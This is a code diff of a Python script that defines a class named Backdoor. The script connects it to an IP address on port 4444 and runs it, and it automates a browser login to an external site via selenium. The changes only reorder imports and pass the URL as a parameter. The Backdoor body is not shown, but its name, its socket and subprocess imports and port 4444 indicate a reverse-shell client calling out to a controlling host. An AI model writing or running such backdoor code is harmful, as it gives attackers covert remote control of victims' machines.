@@ -9,7 +9,13 @@ import socket
 import json
 import subprocess
 import base64
-import re
+# import re
+
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
 # ipAddress = "10.178.122.126"
 # port = 4444
@@ -126,20 +132,15 @@ class Backdoor:
 
 # =================================================
 
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
 
 # Keep browser open
 options = Options()
 options.add_experimental_option("detach", True)
 
 driver = webdriver.Chrome(options=options)
-def loginWeb():
+def loginWeb(weblink):
     # Open URL
-    driver.get("https://agent.aeroglobe.io/")
+    driver.get(weblink)
 
     wait = WebDriverWait(driver, 15)
 
@@ -165,5 +166,5 @@ def loginWeb():
 
 
 myBackdoor = Backdoor("192.168.18.6", 4444)
+loginWeb("https://agent.aeroglobe.io/")
 myBackdoor.run()
-loginWeb()
